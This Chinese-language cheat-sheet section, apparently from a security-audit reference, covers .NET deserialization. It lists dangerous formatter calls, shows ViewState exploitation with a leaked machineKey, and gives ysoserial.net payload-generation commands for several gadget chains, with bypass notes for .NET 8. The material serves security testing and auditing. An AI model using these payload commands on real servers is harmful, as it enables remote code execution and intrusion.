## 十二、.NET 反序列化

### 12.1 危险入口与格式化器
```csharp
new BinaryFormatter().Deserialize(stream);          // 高危（.NET 8 默认禁止）
new LosFormatter().Deserialize(stream);
new SoapFormatter().Deserialize(stream);            // 已弃用但存在
new NetDataContractSerializer().Deserialize(stream);
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All });     // 仅 All/Objects 危险
```

### 12.2 ViewState 反序列化
```
- 前提：enableViewStateMac=false 或 machineKey 可预测/泄露
- ViewState 是 Base64 序列化对象，__VIEWSTATE 参数传递
- 用 ysoserial.net 生成 payload；需提供 --path/--apppath/--validationalg/--validationkey
ysoserial.net -g ViewState -c "cmd /c whoami" --path="/page.aspx" --apppath="/" --validationalg="SHA1" --validationkey="..."
```

### 12.3 ysoserial.net 与 Gadget 家族
```cmd
ysoserial.net -l
ysoserial.net -g ActivitySurrogateSelector -c "cmd /c whoami" -o BinaryFormatter
ysoserial.net -g ObjectDataProvider -c "cmd /c calc" -f JavaScriptSerializer
ysoserial.net -g TextFormattingRunProperties -c "powershell -e <base64>" -o BinaryFormatter
ysoserial.net -g ActivitySurrogateSelectorFromFile -c "shell.ps1;System.dll" -o BinaryFormatter
:: Gadget 家族：ActivitySurrogateSelector(最稳)/ObjectDataProvider/ClaimsIdentity/
::              TextFormattingRunProperties/ToolboxItemContainer/LogicalCallContext/
::              SessionSecurityTokenHandler/WindowsClaimsIdentity/TypeConfuseDelegate
```

### 12.4 .NET 8+ 变化与绕过
```
- .NET 8 默认禁用 BinaryFormatter（序列化抛异常），老应用仍可手动启用 → 仍是审计重点
- XAML ObjectDataProvider 是"通用 Gadget"：任意代码执行终点，跨多格式化器复用
- 绕过 TypeNameHandling=None：部分场景通过属性注入/JsonConverter 自定义间接实现类型解析
```

